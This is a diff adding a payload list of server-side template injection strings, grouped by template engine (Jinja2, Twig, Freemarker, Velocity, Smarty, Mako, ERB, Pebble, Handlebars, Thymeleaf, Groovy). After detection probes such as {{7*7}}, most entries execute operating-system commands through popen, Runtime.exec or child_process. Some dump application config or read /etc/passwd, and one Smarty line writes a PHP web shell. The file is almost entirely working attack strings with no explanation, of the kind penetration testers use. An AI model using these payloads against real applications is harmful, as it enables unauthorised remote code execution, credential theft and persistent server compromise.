@@ -1,0 +1,104 @@
+# SSTI Payloads
+
+# Detection payloads
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+{7*7}
+*{7*7}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{settings}}
+{{''}}
+${''}
+#{''}
+
+# Jinja2 (Python Flask/Django)
+{{config}}
+{{config.items()}}
+{{config.__class__.__init__.__globals__}}
+{{self.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{"".__class__.__bases__[0].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('exec')}}
+{{['id']|filter('system')}}
+{{app.request.server.all|join(',')}}
+
+# Freemarker (Java)
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+
+# Velocity (Java)
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+#set($process=$ex.getInputStream())
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{`id`}
+
+# Mako (Python)
+${self.module.cache.util.os.popen('id').read()}
+<%import os%>${os.popen('id').read()}
+<%import subprocess%>${subprocess.check_output('id', shell=True)}
+
+# ERB (Ruby)
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read() %>
+<%= %x(id) %>
+<%= exec('id') %>
+
+# Pebble (Java)
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id') }}
+
+# Handlebars (JavaScript)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Thymeleaf (Java)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+
+# Groovy
+${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}
